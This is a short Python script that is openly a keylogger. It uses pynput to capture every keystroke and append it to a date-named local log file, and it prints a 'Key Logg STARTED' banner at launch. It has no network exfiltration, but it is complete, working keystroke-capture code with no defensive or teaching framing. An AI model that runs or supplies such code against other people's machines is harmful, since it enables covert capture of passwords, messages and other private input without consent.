import pynput
import datetime


# Create a function that will be called every time a key is pressed
def on_press(key):
    # Get the today's date
    date = datetime.date.today()

    # Creating file name the date vice key log
    log_file = f"key_log_{date}.txt"

    # Open the log file in append mode
    with open(log_file, "a") as f:
        # Write the key press data to the log file
        f.write(f"{key}\n")


def on_release(key):
    # print(key)
    pass


if __name__ == '__main__':
    # Print the keylogger logo
    print("   _   _   _   _   _   _   _   _   ")
    print("  / \ / \ / \ / \ / \ / \ / \ / \ ")
    print(" | K | e | y |   | L | o | g | g |")
    print(" | S | T | A | R | T | E | D |   |")
    print("  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ ")

    # Create a keyboard listener
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
